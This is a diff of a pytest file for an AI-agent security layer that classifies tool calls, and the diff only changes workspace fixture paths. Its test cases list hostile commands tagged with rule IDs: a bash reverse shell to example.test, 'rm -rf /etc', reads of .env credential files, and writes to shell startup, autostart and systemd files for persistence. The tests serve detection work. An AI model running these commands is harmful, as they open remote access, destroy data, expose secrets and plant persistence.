@@ -22,15 +22,15 @@ from agent_runner.security.packages import (
 
 
 def test_normalizes_sdk_tool_shapes_into_semantic_artifacts() -> None:
-    read = normalize_tool_request("Read", {"file_path": "/workspace/group/.env"})
+    read = normalize_tool_request("Read", {"file_path": "/home/agent/workspace/.env"})
     shell = normalize_tool_request("shell", {"commands": ["uv add requests==2.32.5"]})
     edit = normalize_tool_request(
         "apply_patch",
-        {"path": "/workspace/group/app.py", "diff": "@@ change"},
+        {"path": "/home/agent/workspace/app.py", "diff": "@@ change"},
     )
 
     assert [(artifact.kind, artifact.value) for artifact in read.artifacts] == [
-        (ArtifactKind.PATH_READ, "/workspace/group/.env")
+        (ArtifactKind.PATH_READ, "/home/agent/workspace/.env")
     ]
     assert (ArtifactKind.COMMAND, "uv add requests==2.32.5") in {
         (artifact.kind, artifact.value) for artifact in shell.artifacts
@@ -38,7 +38,7 @@ def test_normalizes_sdk_tool_shapes_into_semantic_artifacts() -> None:
     assert shell.packages[0].ecosystem is PackageEcosystem.PYPI
     assert shell.packages[0].name == "requests"
     assert shell.packages[0].version == "2.32.5"
-    assert (ArtifactKind.PATH_WRITE, "/workspace/group/app.py") in {
+    assert (ArtifactKind.PATH_WRITE, "/home/agent/workspace/app.py") in {
         (artifact.kind, artifact.value) for artifact in edit.artifacts
     }
 
@@ -68,9 +68,9 @@ def test_free_form_patch_transport_is_not_parsed_as_a_shell_command() -> None:
         ("shell", {"command": "bash -i >& /dev/tcp/example.test/4444 0>&1"}, "NET001"),
         ("execute", {"command": "rm -rf /etc"}, "CMD001"),
         ("Write", {"file_path": "/home/me/.bashrc", "content": "curl x"}, "PERSIST001"),
-        ("Read", {"file_path": "/workspace/group/.env"}, "CRED001"),
+        ("Read", {"file_path": "/home/agent/workspace/.env"}, "CRED001"),
         ("Bash", {"command": "cat .env"}, "CRED001"),
-        ("Read", {"file_path": "/workspace/group/.env.production"}, "CRED001"),
+        ("Read", {"file_path": "/home/agent/workspace/.env.production"}, "CRED001"),
         ("Bash", {"command": "echo x >> ~/.zshrc"}, "PERSIST001"),
         ("Bash", {"command": "printf x | tee ~/.config/autostart/x.desktop"}, "PERSIST001"),
         ("Bash", {"command": "cp x ~/.config/systemd/user/x.service"}, "PERSIST001"),
@@ -119,8 +119,8 @@ def test_generated_codex_skill_registry_remains_readable(
 @pytest.mark.parametrize(
     ("tool_name", "tool_input"),
     [
-        ("Read", {"file_path": "/workspace/group/notes.md"}),
-        ("Edit", {"file_path": "/workspace/group/notes.md", "new_string": "updated"}),
+        ("Read", {"file_path": "/home/agent/workspace/notes.md"}),
+        ("Edit", {"file_path": "/home/agent/workspace/notes.md", "new_string": "updated"}),
         ("Bash", {"command": "cat .env"}),
         ("shell", {"commands": ["ls -la"]}),
     ],
